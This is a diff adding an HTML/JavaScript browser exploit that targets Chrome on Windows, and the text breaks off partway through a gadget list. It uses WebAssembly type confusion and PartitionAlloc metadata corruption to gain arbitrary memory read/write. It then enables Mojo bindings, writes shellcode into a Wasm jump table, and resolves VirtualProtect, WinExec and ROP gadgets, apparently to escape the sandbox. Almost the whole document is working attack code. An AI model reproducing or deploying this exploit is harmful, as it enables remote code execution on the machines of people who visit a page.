@@ -1,0 +1,1537 @@
+<html>
+  <head>
+<script src="./mojo_bindings.js"></script>
+<script src="./third_party/blink/public/mojom/blob/blob_registry.mojom.js"></script>
+<script src="./third_party/blink/public/mojom/filesystem/file_system.mojom.js"></script>
+</head>
+<body>
+<script>
+var iframe = document.createElement("iframe");
+iframe.src = "https://192.168.50.100:8001";
+document.body.appendChild(iframe);
+  
+var g_demo_leak_value;
+var g_rw_buffer;
+var g_victim_buffer_addr;
+var g_metadata_area;
+var g_frame_map_ptr;
+var g_victim_buffer = new ArrayBuffer(2 * 1024 * 1024);
+var g_keeper = [];
+var g_deopt_obj = {};
+
+var g_deopt_count = 0;
+var g_eval_idx = 0;
+
+var MASK32 = BigInt(0xFFFFFFFF);
+var BITS32 = 32n;
+
+  // ================================== utils ==================================
+  
+  function getRandomInt(max) {
+    return Math.floor(Math.random() * Math.floor(max));
+  }
+  
+  function toPositive(input) {
+    return input < 0 ? (0x100000000 + input) : input;
+  }
+
+  function maybeToNegative(input) {
+    if (input > 0x80000000) { return -(0x100000000 - input); }
+    else if (input < 0x80000000) { return input; }
+    else { return -2147483648; }
+  }
+
+  function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
+
+  function getSuperPageBase(addr) {
+    let superPageOffsetMask = (BigInt(1) << BigInt(21)) - BigInt(1);
+    let superPageBaseMask = ~superPageOffsetMask;
+    let superPageBase = addr & superPageBaseMask;
+    return superPageBase;
+  }
+
+  function getPartitionPageBaseWithinSuperPage(addr, partitionPageIndex) {
+    let superPageBase = getSuperPageBase(addr);
+    let partitionPageBase = partitionPageIndex << BigInt(14);
+    let finalAddr = superPageBase + partitionPageBase;
+    return finalAddr;
+  }
+
+  function getPartitionPageIndex(addr) {
+    let superPageOffsetMask = (BigInt(1) << BigInt(21)) - BigInt(1);
+    let partitionPageIndex = (addr & superPageOffsetMask) >> BigInt(14);
+    return partitionPageIndex;
+  }
+
+  function getMetadataAreaBaseFromPartitionSuperPage(addr) {
+    let superPageBase = getSuperPageBase(addr);
+    let systemPageSize = BigInt(0x1000);
+    return superPageBase + systemPageSize;
+  }
+
+  function getPartitionPageMetadataArea(addr) {
+    let superPageOffsetMask = (BigInt(1) << BigInt(21)) - BigInt(1);
+    let partitionPageIndex = (addr & superPageOffsetMask) >> BigInt(14);
+    let pageMetadataSize = BigInt(0x20);
+    let partitionPageMetadataPtr = getMetadataAreaBaseFromPartitionSuperPage(addr) + partitionPageIndex * pageMetadataSize;
+    return partitionPageMetadataPtr;
+  }
+
+  function byteSwapBigInt(x) {
+    let result = BigInt(0);
+    let tmp = x;
+    for (let i = 0; i < 8; i++) {
+      result = result << BigInt(8);
+      result += tmp & BigInt(0xFF);
+      tmp = tmp >> BigInt(8);
+    }
+    return result;
+  }
+
+  function read64(rw_helper, addr, restore_value) {
+    rw_helper[0] = addr;
+    var tmp = new BigUint64Array(2);
+    tmp.buffer;
+    g_keeper.push(tmp);
+    tmp[0] = byteSwapBigInt(rw_helper[0]); // restore
+    tmp[1] = restore_value; // restore
+    return tmp[0];
+  }
+
+  function read64WithBuffer(rw_helper, addr, restore_value) {
+    rw_helper[0] = addr;
+    var tmp = new BigUint64Array(2);
+    tmp.buffer;
+    // no need to push
+    // there will be another reference to this array buffer
+    // g_keeper.push(tmp);
+    tmp[0] = byteSwapBigInt(rw_helper[0]); // restore
+    tmp[1] = restore_value; // restore
+    return [ tmp[0], tmp ];
+  }
+
+  function write64(rw_helper, addr, value, restore_value) {
+    var backup = rw_helper[0];
+    rw_helper[0] = addr;
+    var tmp = new BigUint64Array(2);
+    tmp.buffer;
+    g_keeper.push(tmp);
+    tmp[0] = value;
+    tmp[1] = restore_value;
+    rw_helper[0] = backup;
+  }
+
+  function read64Multiple(rw_helper, addr, count, initial_restore_value) {
+    var value;
+    for(var i = count - 1; i >= 0; i--){
+      value = read64(rw_helper, addr + BigInt(i) * 8n, i == count -1 ? initial_restore_value : value);
+    }
+    return value;
+  }
+
+  class RWHelper {
+    constructor(rw_helper, base, victim_buffer, victim_buffer_addr, wasm_mem, wasm_mem_addr) {
+
+      // read the extension field of victim arraybuffer first
+      var extension_addr = read64(rw_helper, victim_buffer_addr -1n + 0x1cn, 2n);
+      
+      [this.ori_backing_store, this.rw_buffer] = read64WithBuffer(rw_helper, victim_buffer_addr -1n + 0x14n, extension_addr);
+      this.base = base;
+      this.dv = new DataView(victim_buffer);
+      this.wasm_mem = wasm_mem;
+      this.wasm_mem_addr = wasm_mem_addr;
+      
+      var wasm_code = new Uint8Array([
+        0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
+        0x01, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x60,
+        0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80,
+        0x00, 0x01, 0x00, 0x06, 0x81, 0x80, 0x80, 0x80,
+        0x00, 0x00, 0x07, 0x85, 0x80, 0x80, 0x80, 0x00,
+        0x01, 0x01, 0x61, 0x00, 0x00, 0x0a, 0x8a, 0x80,
+        0x80, 0x80, 0x00, 0x01, 0x84, 0x80, 0x80, 0x80,
+        0x00, 0x00, 0x41, 0x00, 0x0b
+      ]);
+      
+      var rce_wasm_instance = new WebAssembly.Instance(new WebAssembly.Module(wasm_code));
+      this.rce_wasm_func = rce_wasm_instance.exports.a;
+
+      var rce_wasm_instance_addr = this.leakPtr(rce_wasm_instance);
+      // console.log("rce_wasm_instance_addr : 0x" + rce_wasm_instance_addr.toString(16));
+      var jump_table_addr = this.read64(rce_wasm_instance_addr - 1n + 0x68n);
+      // print("jump_table_addr : 0x" + jump_table_addr.toString(16));
+      this.jump_table_addr = jump_table_addr;
+      //0x1000
+    }
+
+    setBackingStore(addr) {
+      this.rw_buffer[0] = addr;
+    }
+
+    read64(addr) {
+      var tmp_obj = [];
+      tmp_obj[g_eval_idx] = g_eval_idx + 1;
+      g_eval_idx = getRandomInt(10);
+      this.setBackingStore(addr);
+      return this.dv.getBigUint64(0, true, ...tmp_obj);
+    }
+    read32(addr) {
+      var tmp_obj = [];
+      tmp_obj[g_eval_idx] = g_eval_idx + 1;
+      g_eval_idx = getRandomInt(10);
+      this.setBackingStore(addr);
+      return this.dv.getUint32(0, true, ...tmp_obj);
+    }
+    read16(addr) {
+      var tmp_obj = [];
+      tmp_obj[g_eval_idx] = g_eval_idx + 1;
+      g_eval_idx = getRandomInt(10);
+      this.setBackingStore(addr);
+      return this.dv.getUint16(0, true, ...tmp_obj);
+    }
+    read8(addr) {
+      var tmp_obj = [];
+      tmp_obj[g_eval_idx] = g_eval_idx + 1;
+      g_eval_idx = getRandomInt(10);
+      this.setBackingStore(addr);
+      let value = this.dv.getUint8(0, true, ...tmp_obj);
+      return value;
+    }
+
+    write64(addr, value) {
+      var tmp_obj = [];
+      tmp_obj[g_eval_idx] = g_eval_idx + 1;
+      g_eval_idx = getRandomInt(10);
+      this.setBackingStore(addr);
+      this.dv.setBigUint64(0, value, true, ...tmp_obj);
+    }
+
+    write32(addr, value) {
+      var tmp_obj = [];
+      tmp_obj[g_eval_idx] = g_eval_idx + 1;
+      g_eval_idx = getRandomInt(10);
+      this.setBackingStore(addr);
+      this.dv.setUint32(0, value, true, ...tmp_obj);
+    }
+
+    leakPtr(obj) {
+      this.wasm_mem.x = obj;
+      
+      var prop_array_addr = this.base + (this.read64(this.wasm_mem_addr - 1n) >> BITS32);
+      return this.base + (this.read64(prop_array_addr - 1n + 4n) >> BITS32);
+    }
+
+    setBytes(address, array) {
+      var tmp_obj = [];
+      tmp_obj[g_eval_idx] = g_eval_idx + 1;
+      g_eval_idx = getRandomInt(10);
+      this.setBackingStore(address);
+      for (let i = 0; i < array.length; i += 4) {
+          var a = array[i] == undefined ? 0 : array[i];
+          var b = array[i + 1] == undefined ? 0 : array[i + 1];
+          var c = array[i + 2] == undefined ? 0 : array[i + 2];
+          var d = array[i + 3] == undefined ? 0 : array[i + 3];
+          
+          var value = a + (b << 8) + (c << 16) + (d << 24);
+          this.dv.setUint32(i, value, true, ...tmp_obj);
+      }
+    }
+
+    restoreBackingStore() {
+      this.setBackingStore(this.ori_backing_store)
+    }
+    
+    rce(shellcode) {
+      this.setBytes(this.jump_table_addr, shellcode);
+      this.rce_wasm_func();
+    }
+
+  }
+
+  // ================================== utils ==================================
+
+  refresh = () => { fetch(getRandomInt(0xffffffff).toString() + "_refresh") }
+
+  function gc() {
+    for (var i = 0; i < 0x50; i++) new Array(0x1000);
+  }
+
+  function moo(input) {
+    g_demo_leak_value = input;
+    return;
+  }
+  
+  fetchConfusedResponse = (url) => { return fetch(url) }
+
+  async function cacheModule(url) {
+    for (var i = 0; i < 0x6; i++) {
+      var module = await WebAssembly.compileStreaming(fetch(url));
+      await sleep(100);
+    }
+  }
+
+  async function generateConfusedInstance(response) {
+    var module = await WebAssembly.compileStreaming(Promise.resolve(response));
+
+    var tmp_ab_array = [];
+    for (var i = 0; i < 0x100; i++) {
+      var t = new ArrayBuffer(0x10);
+    }
+    gc(); gc(); gc(); gc();
+    await sleep(100);
+
+    for (var i = 0; i < 0x100; i++) {
+      var t = new ArrayBuffer(0x10);
+    }
+    gc(); gc(); gc(); gc();
+    await sleep(100);
+
+    var ins = await WebAssembly.instantiate(module, { q: { moo: moo } });
+
+    ins.exports.demo(0);
+    if (g_demo_leak_value != 0) {
+    } else {
+      return null;
+    }
+
+    var value = ins.exports.get_4();
+    
+    if (value != 0) {
+      return ins;
+    } else {
+      return null;
+    }
+  }
+
+
+  function getArbitraryRW(ins) {
+    var leak_next_ptr_high = toPositive(ins.exports.get_5());
+    var leak_next_ptr_low = toPositive(ins.exports.get_4());
+    var leak_next_ptr = byteSwapBigInt((BigInt(leak_next_ptr_high) << 32n) + BigInt(leak_next_ptr_low));
+
+    var super_base = getSuperPageBase(leak_next_ptr);
+    var partition_idx = getPartitionPageIndex(leak_next_ptr);
+    var part_page = getPartitionPageBaseWithinSuperPage(leak_next_ptr, partition_idx);
+    var metadata_base = getMetadataAreaBaseFromPartitionSuperPage(leak_next_ptr);
+    var metadata_area = getPartitionPageMetadataArea(leak_next_ptr);
+
+    var transfer = byteSwapBigInt(metadata_area);
+    ins.exports.set_4(maybeToNegative(Number(transfer & MASK32)));
+    ins.exports.set_5(maybeToNegative(Number(transfer >> 32n)));
+    
+
+    g_keeper.push(new ArrayBuffer(0x10));
+    
+    g_rw_buffer = new ArrayBuffer(0x10);
+    var rw_helper = new BigUint64Array(g_rw_buffer);
+    g_keeper.push(g_rw_buffer);
+
+    g_metadata_area = metadata_area;
+
+    return leakV8Heap(rw_helper, metadata_area);
+  }
+
+
+  function leakV8Heap(rw_helper, metadata_area) {
+    
+    var ptr_to_wasm_engine = read64Multiple(rw_helper, metadata_area + 0x10n, 2, 0n) - 0x32938n;
+    
+    
+    g_frame_map_ptr = ptr_to_wasm_engine + 0x46420n;
+    
+    var wasm_engine_ptr = read64Multiple(rw_helper, ptr_to_wasm_engine, 2, 0x8000006fn);
+    
+    var isolate_map_inner = read64(rw_helper, wasm_engine_ptr + 0xb0n, 1n);
+
+    
+    var isolate_ptr = read64Multiple(rw_helper, isolate_map_inner + 0x10n, 4, 0n);
+
+
+    var heap_ptr = isolate_ptr + 0x9890n;
+
+
+   
+    var old_space_ptr = read64Multiple(rw_helper, heap_ptr + 0x150n, 6, 0n); // space_[OLD_SPACE]
+
+    // LinearAllocationArea allocation_info_
+    var allocation_info_ptr = old_space_ptr + 0xc0n;
+
+    // top_
+    var top = read64Multiple(rw_helper, allocation_info_ptr + 0x8n, 2, 0n);
+
+    var mem = new WebAssembly.Memory({ initial: 1, maximum: 1 });
+    
+    var mem_addr = top + 0x51n;
+
+    var base = mem_addr & 0xFFFFFFFF00000000n;
+    mem.x = g_victim_buffer;
+
+
+    var prop_array = base + (read64Multiple(rw_helper, mem_addr - 1n, 4, 0n) >> BITS32);
+   
+    g_victim_buffer_addr = base + (read64(rw_helper, prop_array - 1n + 4n, 0n) >> BITS32);
+    return new RWHelper(rw_helper, base, g_victim_buffer, g_victim_buffer_addr, mem, mem_addr);
+  }
+  
+  
+  function enableMojo(rw_helper){
+    var begin_ptr = rw_helper.read64(g_frame_map_ptr + 0x8n);
+
+    var node_ptr = rw_helper.read64(begin_ptr + 0x28n);
+
+    var render_frame_ptr = node_ptr;
+
+    var enabled_bindings = render_frame_ptr + 0x5e8n;
+    
+    var enable_mojo_js_bindings = render_frame_ptr + 0x5ecn;
+    
+    rw_helper.write32(enabled_bindings, 0x2);
+    rw_helper.write32(enable_mojo_js_bindings, 0x1);
+  }
+
+  function cleanArrayBuffer(rw_helper, buffer) {
+    var addr = rw_helper.leakPtr(buffer);
+    var extension = rw_helper.read64(addr - 1n + 0x1cn);
+    var backing_store = rw_helper.read64(extension + 8n);
+    rw_helper.write64(backing_store, 0n);
+  }
+  
+  function fixMetaData(rw_helper){
+    rw_helper.write64(g_metadata_area, 0n);
+  }
+  
+  function cleanup(rw_helper) {
+    // objs to clean up
+    // g_keeper(aleady contains g_rw_buffer), g_victim_buffer,  and rw_buffer in RWHelper class
+    // and meta data area
+
+    fixMetaData(rw_helper);
+
+    g_keeper.forEach((value) => {
+      cleanArrayBuffer(rw_helper, value instanceof ArrayBuffer ? value : value.buffer);
+    });
+
+    cleanArrayBuffer(rw_helper, rw_helper.rw_buffer.buffer);
+    cleanArrayBuffer(rw_helper, g_victim_buffer);
+    return;
+  }
+
+  async function start(){
+    await refresh();
+    
+    var flag = sessionStorage.getItem('is_refresh');
+    var url = "test_" + getRandomInt(0x1000000).toString() + ".wasm";
+
+    var response = await fetchConfusedResponse(url);
+    var response_clone = response.clone();
+
+    await cacheModule(url);
+
+    var instance = await generateConfusedInstance(response_clone);
+    if (instance == null) {
+      return;
+    }
+
+    var rw_helper = getArbitraryRW(instance);
+    
+    
+    if(flag){
+      fixMetaData(rw_helper);
+      cleanup(rw_helper);
+      await testFind(rw_helper);
+    } else {
+      sessionStorage.setItem('is_refresh', true);
+      enableMojo(rw_helper);
+      cleanup(rw_helper);
+      window.location.reload();
+    }
+  }
+
+ window.onload = start;
+</script>
+
+<script>
+
+SIZEOF_PVOID = 8;
+LEAK_ADDR = 0n;//FILE_IO_API + 0x129C56C;// u `pepper_in_process_router.cc:98`
+CHROME_BASE = 0n;
+CHROME_DLL_LEN = 0x922B000n;
+FILE_IO_API = 0n;//0x00007ffea003f6e8;// u `ppb_file_io_thunk.cc:147`
+FILE_REF_API = 0n;
+FILE_SYSTEM_API = 0n;//0x55555f979ba8;
+hostGlobals = 0n;
+CHROME_CHILD_CORE = 0n;// u `entrypoints.cc:29`
+
+FILE_NAME = "/file01/";
+NOT_EXIST_FILE_NAME = "/temp/file01/\0";
+let dir_deepth = 0x78000;
+let wait_time1 = 1500;
+let wait_time2 = 1800;
+FILE_NAMEx = "/1".repeat(dir_deepth)+"/x";
+
+let leak_value = 0;
+
+const kSprayAllocationCount = 0x1000; //for exploit
+// target address for our heap/vm-spray, and the fake objects it will contain
+const kSprayPageNum = 0x09;
+const kSprayOffset = 1;
+const kSprayPtr = 0x80000000;
+
+const kStackSize = 0x200;
+const kShellcodeSize = 0x800;
+
+// libraries that we need to find in renderer address space
+var chrome_child = null;
+var kernel32 = null;
+var ntdll = null;
+
+// pointers that we need for our pivot/rop chain
+var virtual_alloc_ptr = 0n;
+var virtual_protect_ptr = 0n;
+var memcpy_ptr = 0n;
+
+var pivot_gadget_ptr = 0x133713371337n;
+var pop_gadget_ptr = 0n;
+var ret_gadget_ptr = 0x233723372337n;
+var mov_rcx_rax_gadget_ptr = 0n;
+var jmp_rax_gadget_ptr = 0n;
+
+// pointers that we need to patch into our payload
+var winexec_ptr = 0n;
+
+// patch addr
+var ipc_patch = null;
+var ipc_vmmap = null;
+var ipccode_ptr1 = null;
+var ipccode_ptr2 = null;
+var UnpackMessage_func = null;
+var Get_func = null;
+
+var nacl_patch = null;
+
+var fs_patch = null;
+var fs_vmmap = null;
+var fscode_ptr1 = null;
+var fscode_ptr2 = null;
+var MessageT_func = null;
+var SendCreate_func = null;
+var DMessage_func = null;
+
+
+let ppInstance, apiTable;
+
+let mapAddr1 = 0n;
+let fileNameAddress = 0n;
+
+let retValueAddress,
+callbackStructAddress,
+completionFlagAddress,
+callbackAddress;
+
+callApi = (rce, module, name, async, ...args) => {
+  let callback;
+  if (async != 0) {
+    rce.write32(completionFlagAddress,0);
+    rce.write32(completionFlagAddress + 4n,0);
+    args.push(callbackStructAddress);
+  }
+  let optionalArg = (index, ...code) => args.length > index ? [code, I64ToBytes(args[index])] : [],
+  additionalArgs = _ => {
+    let result = [];
+    for (let i = args.length - 1; i >= 4; --i) {
+      result.push([
+        0x48, 0xB8, I64ToBytes(args[i]), // mov rax, args[i]
+        0x48, 0x89, 0x44, 0x24, i * SIZEOF_PVOID // mov [rsp + ...], rax
+      ]);
+    }
+    return result;
+  },
+  argsSpaceSize = Math.max(roundUp(args.length * SIZEOF_PVOID, 0x10), 0x20);
+  tmp_sc = new Uint8Array(prepareBytes([
+    0x48, 0xC7, 0xC0, 0x08, 0x00, 0x00, 0x00, // mov rax, 8
+    0x48, 0x85, 0xE0, // test rsp, rax
+    0x74, 0x03, // jz +3
+    0x48, 0x31, 0xC0, // xor rax, rax
+    0x48, 0x29, 0xC4, // sub rsp, rax
+    0x50, 0x53, 0x51, // push rax rbx rcx
+    0x56, 0x52, // push rsi rdx
+    0x48, 0x83, 0xEC, argsSpaceSize, // sub rsp, argsSpaceSize
+    optionalArg(0, 0x48, 0xB9), // mov rcx, args[0]
+    optionalArg(1, 0x48, 0xBA), // mov rdx, args[1]
+    optionalArg(2, 0x49, 0xB8), // mov r8, args[2]
+    optionalArg(3, 0x49, 0xB9), // mov r9, args[3]
+    additionalArgs(),
+    0x48, 0xB8, I64ToBytes(apiTable[module][name]), // mov rax, apiTable[module][name]
+    0xFF, 0xD0, // call rax
+    0x48, 0x83, 0xC4, argsSpaceSize, // add rsp, argsSpaceSize
+    0x48, 0xB9, I64ToBytes(retValueAddress), // mov rcx, retValueAddress
+    0x48, 0x89, 0x01, // mov qword ptr[rcx], rax
+    0x5a, 0x5e,  // pop rdx rsi
+    0x59, 0x5B, 0x58, // pop rcx rbx rax
+    0x48, 0x01, 0xC4, // add rsp, rax
+    0xC3 // ret
+  ]));
+  rce.rce(tmp_sc);
+  if (async == 1) {
+    //return Promise.resolve(0);
+    return new Promise(resolve => {
+      let intervalId = setInterval(_ => {
+        if (rce.read32(completionFlagAddress)!=1) {
+          return;
+        }
+        clearInterval(intervalId);
+        resolve();
+      }, 100);
+    });
+  }
+  else if (async == 2) { 
+    return Promise.resolve(0);
+  } else {
+    retValue = rce.read64(retValueAddress);
+    return Promise.resolve(retValue);
+  }
+}
+
+let cleanup2;
+function print(string) {
+  // console.log(string);
+  var log = document.getElementById('log');
+  if (log) {
+    log.innerText += string + '\n';
+  }
+}
+
+function force_gc(){
+  for(var i = 0; i < 0x80000; ++i){
+      var a = new ArrayBuffer();
+  }
+}
+
+function I64ToBytes(num) {
+    let numh = Number(num/0x100000000n);
+    let numl = Number(num&0xffffffffn);
+    var result = [];
+    for (let j = 0; j < 4; ++j) {
+        result.push((numl >>> 8 * j) & 0xff);
+    }
+    for (let j = 0; j < 4; ++j) {
+        result.push((numh>>> 8 * j) & 0xff);
+    }
+    return result;        
+}
+
+roundUp = (value, multiple) => (value + multiple - 1) & ~(multiple - 1);
+function flatten(array) {
+  let result = new Array(array.length),
+      index = 0,
+      flattenInternal = (array, result) => {
+        for (let element of array) {
+          if (Array.isArray(element)) {
+            flattenInternal(element, result)
+          } else {
+            result[index++] = element;
+          }
+        }
+      }
+  flattenInternal(array, result);
+  result.length = index;
+  return result;
+}
+stringToBytes = string => Array.prototype.map.call(string + "\x00", v => v.charCodeAt(0));
+function prepareBytes(shellcode) {
+  let flatArray = flatten(shellcode),
+      roundUpLength = roundUp(flatArray, SIZEOF_PVOID),
+      result = [];
+  while (flatArray.length < roundUpLength) {
+    flatArray.push(0x90);
+  }
+  return flatArray;
+}
+
+function pe64(rce, ptr) {
+  ptr = ptr & 0xffffffffffff0000n;
+  var dword = rce.read32(ptr);
+
+  while ((dword & 0xffff) != 0x5a4d) {
+    ptr -= 0x10000n;
+    dword = rce.read32(ptr);
+  }
+
+  this.rce = rce;
+  this.base = ptr;
+  this.section_bytes = new Map();
+
+  this.parse_headers = function() {
+    this.dos_header_ptr = this.base;
+    let e_lfanew = rce.read32(this.dos_header_ptr + 60n);
+
+    this.nt_header_ptr = this.dos_header_ptr + BigInt(e_lfanew);
+    let nt_magic = rce.read32(this.nt_header_ptr);
+    if (nt_magic != 0x00004550) {
+      this.dos_header_ptr = 0n;
+      this.nt_header_ptr = 0n;
+      return false;
+    }
+    this.file_header_ptr = this.nt_header_ptr + 4n;
+    let machine = rce.read32(this.file_header_ptr);
+    if ((machine & 0xffff) != 0x8664) {
+      this.dos_header_ptr = 0n;
+      this.nt_header_ptr = 0n;
+      this.file_header_ptr = 0n;
+      return false;
+    }
+    this.opt_header_ptr = this.nt_header_ptr + 24n;
+    let opt_magic = rce.read32(this.opt_header_ptr);
+    if ((opt_magic & 0xffff) != 0x20b) {
+      this.dos_header_ptr = 0n;
+      this.nt_header_ptr = 0n;
+      this.file_header_ptr = 0n;
+      this.opt_header_ptr = 0n;
+      return false;
+    }
+    return true;
+  }
+
+  this.getUint16 = function(rva) {
+    return rce.read16(this.base + BigInt(rva));
+  }
+
+  this.getUint32 = function(rva) {
+    return rce.read32(this.base + BigInt(rva));
+  }
+
+  this.getUint64 = function(rva) {
+    return rce.read64(this.base + BigInt(rva));
+  }
+
+  this.getString = function(rva) {
+    var string = '';
+    var byte = this.rce.read8(this.base + BigInt(rva));
+    while (byte != 0 && string.length < 0x100) {
+      string += String.fromCharCode(byte);
+      rva += 1;
+      byte = this.rce.read8(this.base + BigInt(rva));
+    }
+    return string;
+  }
+
+  this.getImport = function(import_module, import_function) {
+    if (this.dos_header_ptr == 0n || this.opt_header_ptr == 0n) {
+      return 0n;
+    }
+
+    let data_directory_ptr = this.opt_header_ptr + 112n;
+    
+    let import_dir_ptr = data_directory_ptr + 8n;
+    let import_rva = this.rce.read32(import_dir_ptr);
+    let import_size = this.rce.read32(import_dir_ptr + 4n);
+    if (import_size == 0) {
+      return 0n;
+    }
+
+    while (true) {
+      var orig_first_thunk_rva = this.getUint32(import_rva);
+      if (orig_first_thunk_rva == 0) {
+        return 0n;
+      }
+
+      let module_name_rva = this.getUint32(import_rva + 12);
+      let module_name = this.getString(module_name_rva);
+      // print(module_name);
+      if (module_name == import_module) {
+        break;
+      }
+
+      import_rva += 20;
+      orig_first_thunk_rva = this.getUint32(import_rva);
+    }
+
+    var first_thunk_rva = this.getUint32(import_rva + 16);
+    var thunk_rva = orig_first_thunk_rva;
+    while (true) {
+      var import_by_name_rva = this.getUint32(thunk_rva);
+      if (import_by_name_rva == 0) {
+        return 0n;
+      }
+
+      var function_name_rva = import_by_name_rva + 2;
+      var function_name = this.getString(function_name_rva);
+      // print(function_name);
+      if (function_name == import_function) {
+        return this.getUint64(first_thunk_rva);
+      }
+
+      first_thunk_rva += 8;
+      thunk_rva += 8;
+    }
+  }
+
+  this.getExport = function(export_function) {
+    if (this.dos_header_ptr == 0n || this.opt_header_ptr == 0n) {
+      return 0n;
+    }
+
+    let data_directory_ptr = this.opt_header_ptr + 112n;
+    let export_dir_ptr = data_directory_ptr;
+    let export_rva = this.rce.read32(export_dir_ptr);
+    let export_size = this.rce.read32(export_dir_ptr + 4n);
+    if (export_size == 0) {
+      return 0n;
+    }
+
+    var export_name_count = this.getUint32(export_rva + 0x18);
+    var export_function_rva = this.getUint32(export_rva + 0x1c);
+    var export_name_rva = this.getUint32(export_rva + 0x20);
+    var export_ordinal_rva = this.getUint32(export_rva + 0x24);
+    for (var i = 0; i < export_name_count; ++i) {
+      let name_rva = this.getUint32(export_name_rva + (i * 4));
+      let name = this.getString(name_rva)
+      // print(name);
+      if (name == export_function) {
+        let ordinal = this.getUint16(export_ordinal_rva + (i * 2));
+        let function_rva = this.getUint32(export_function_rva + (ordinal * 4));
+        return this.base + BigInt(function_rva);
+      }
+    }
+
+    return 0n;
+  }
+
+  this.getGadget = function(gadget_bytes) {
+    let opt_header_size = this.rce.read16(this.file_header_ptr + 16n);
+    let section_count = this.rce.read16(this.file_header_ptr + 2n);
+    let section_header_ptr = this.opt_header_ptr + BigInt(opt_header_size);
+    
+    for (var i = 0; i < section_count; ++i) {
+      let characteristics = this.rce.read32(section_header_ptr + 36n);
+      if ((characteristics & 0xe0000000) == 0x60000000) {
+        // this section is read/execute, so scan for gadget
+        let section_rva = this.rce.read32(section_header_ptr + 12n);
+        let section_size = this.rce.read32(section_header_ptr + 16n);
+        let section_base = this.base + BigInt(section_rva);
+        if (!this.section_bytes.has(i)) {
+          this.section_bytes[i] = new DataView(new ArrayBuffer(section_size));
+
+          for (var j = 0; j < section_size; j += 8) {
+            this.section_bytes[i].setBigUint64(j, this.getUint64(section_rva + j), true);
+          }
+        }
+
+        for (var j = 0; j < section_size; ++j) {
+          for (var k = 0; k < gadget_bytes.length; ++k) {
+            if (this.section_bytes[i].getUint8(j + k) != gadget_bytes[k]) {
+              break;
+            }
+          }
+          if (k == gadget_bytes.length) {
+            return section_base + BigInt(j);
+          }
+        }
+      }
+    }
+
+    return 0n;
+  }
+
+  if (this.parse_headers() == true) {
+    return this;
+  } else {
+    return null;
+  }
+}
+
+function showMeARWMap(rce){
+  var wasm_code = new Uint8Array([
+    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
+    0x01, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x60,
+    0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80,
+    0x00, 0x01, 0x00, 0x06, 0x81, 0x80, 0x80, 0x80,
+    0x00, 0x00, 0x07, 0x85, 0x80, 0x80, 0x80, 0x00,
+    0x01, 0x01, 0x61, 0x00, 0x00, 0x0a, 0x8a, 0x80,
+    0x80, 0x80, 0x00, 0x01, 0x84, 0x80, 0x80, 0x80,
+    0x00, 0x00, 0x41, 0x00, 0x0b
+  ]);
+  var rce_wasm_instance = new WebAssembly.Instance(new WebAssembly.Module(wasm_code));
+  var rce_wasm_func = rce_wasm_instance.exports.a;
+
+  var rce_wasm_instance_addr = rce.leakPtr(rce_wasm_instance);
+  var jump_table_addr = rce.read64(rce_wasm_instance_addr - 1n + 0x68n);
+  return jump_table_addr;
+}
+
+function showMeAMap(rce){
+    var ab = new ArrayBuffer(0x100000);
+    let dv = new DataView(ab);
+    for(var i = 0; i < FILE_NAMEx.length; i++){
+      dv.setUint8(i, FILE_NAMEx.charCodeAt(i));
+    }
+    g_keeper.push(ab);
+    var store_addr = rce.leakPtr(ab) - 1n + 0x14n
+    return rce.read64(store_addr);
+}
+
+function RWXTheMemory(rce, base_addr, len, pflOldProtect){
+  var stackSize = 0x20;
+  // bool result = VirtualProtect((void *)base_addr, len, PAGE_EXECUTE_READWRITE, &pflOldProtect);
+  var tmp_code = new Uint8Array(prepareBytes([
+    0x48, 0x83, 0xEC, stackSize, // sub rsp, argsSpaceSize
+    0x48, 0xB9, I64ToBytes(base_addr), // mov rcx, args[0]
+    0x48, 0xBA, I64ToBytes(len),// mov rdx, args[1]
+    0x49, 0xB8, I64ToBytes(0x40n), // mov r8, args[2]
+    0x49, 0xB9, I64ToBytes(pflOldProtect), // mov r9, args[3]
+    0x48, 0xB8, I64ToBytes(virtual_protect_ptr), // mov rax, apiTable[module][name]
+    0xFF, 0xD0, // call rax
+    0x48, 0x83, 0xC4, stackSize, // add rsp, argsSpaceSize
+    0xC3 // ret
+  ]));
+  rce.rce(tmp_code);
+}
+
+// Stage 0 : patch
+function find_libraries(rce) {
+  print('[1] find_libraries');
+
+  let window_ptr = rce.leakPtr(window) - 1n;
+  let chrome_child_ptr = rce.read64(window_ptr + 0x10n);
+  // print('  [*] chrome_child_ptr:              0x' + chrome_child_ptr.toString(16));
+  chrome_child = new pe64(rce, chrome_child_ptr);
+  // print('  [*] chrome_child:              0x' + chrome_child.base.toString(16));
+  CHROME_BASE = chrome_child.base;
+
+  virtual_alloc_ptr = chrome_child.getImport('KERNEL32.dll', 'VirtualAlloc');
+  // print('    [-] kernel32!VirtualAlloc:   0x' + virtual_alloc_ptr.toString(16));
+
+  kernel32 = new pe64(rce, virtual_alloc_ptr);
+  // print('  [*] kernel32:                  0x' + kernel32.base.toString(16));
+
+  virtual_protect_ptr = kernel32.getExport('VirtualProtect');
+  // print('    [-] kernel32!VirtualProtect: 0x' + virtual_protect_ptr.toString(16));
+
+  winexec_ptr = kernel32.getExport('WinExec');
+  // print('    [-] kernel32!WinExec:        0x' + winexec_ptr.toString(16));
+
+  memcpy_ptr = kernel32.getImport('ntdll.dll', 'memcpy');
+  // print('    [-] ntdll!memcpy:            0x' + memcpy_ptr.toString(16));
+
+  ntdll = new pe64(rce, memcpy_ptr);
+  // print('  [*] ntdll:                     0x' + ntdll.base.toString(16));
+  pivot_gadget_ptr = ntdll.getGadget([
+      0x48, 0x8b, 0x51, 0x50, // mov rdx, qword ptr [rcx+50h]
+      0x48, 0x8b, 0x69, 0x18, // mov rbp, qword ptr [rcx+18h]
+      0x48, 0x8b, 0x61, 0x10, // mov rsp, qword ptr [rcx+10h]
+      0xff, 0xe2              // jmp rdx
+    ]);
+  print('    [-] gadget1:            0x' + pivot_gadget_ptr.toString(16));
+
+  pop_gadget_ptr = ntdll.getGadget([
+      0x58,                   // pop rax
+      0x5a,                   // pop rdx
+      0x59,                   // pop rcx
+      0x41, 0x58,             // pop r8
+      0x41, 0x59,             // pop r9
